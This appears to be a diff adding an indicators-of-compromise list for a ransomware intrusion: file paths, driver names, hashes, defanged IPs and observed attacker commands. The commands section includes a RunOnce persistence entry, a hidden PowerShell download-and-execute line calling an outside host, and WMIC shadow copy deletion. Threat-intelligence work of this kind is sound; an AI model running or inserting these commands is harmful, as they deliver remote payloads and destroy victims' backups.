@@ -1,0 +1,32 @@
+File Name
+C:\Users\[Redacted]\AppData\Local\Temp\2\
+socks aug\socks.exe
+C:\Users\[Redacted]\AppData\Local\Temp\2\a65.exe
+C:\Users\[Redacted]\AppData\Local\Temp\2\netscanold.exe
+df.exe
+2025-05-15_c111476f7b394776b515249ecb6b20e6_darkside_elex_lockbit
+Truesight.sys
+RentDrv.sys
+
+Hashes
+97B70E89B5313612A9E7A339EE82AB67
+A50637F5F7A3E462135C0AE7C7AF0D91
+BB7C575E798FF5243B5014777253635D
+C111476F7B394776B515249ECB6B20E6
+1aed62a63b4802e599bbd33162319129501d603cceeb5e1eb22fd4733b3018a3
+9165d4f3036919a96b86d24b64d75d692802c7513f2b3054b20be40c212240a5
+4b97d71e039d4ba71c7e9c9dfd1d447f0b984984e424eb8b720e182f46ba6c10
+bfc2ef3b404294fe2fa05a8b71c7f786b58519175b7202a69fe30f45e607ff1c
+
+IP Address
+2.147.68[.]96
+185.59.221[.]75
+69.4.234[.]20
+185.73.125[.]8
+
+Commands
+reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "socks5" /t REG_SZ /d "%TMP%\socks aug\socks.exe" /f
+powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://185.73.125[.]8:80/a67')
+
+SELECT * FROM Win32_ShadowCopy
+cmd.exe /c C:\Windows\System32\wbem\WMIC.exe shadowcopy where "ID='%s'" delete
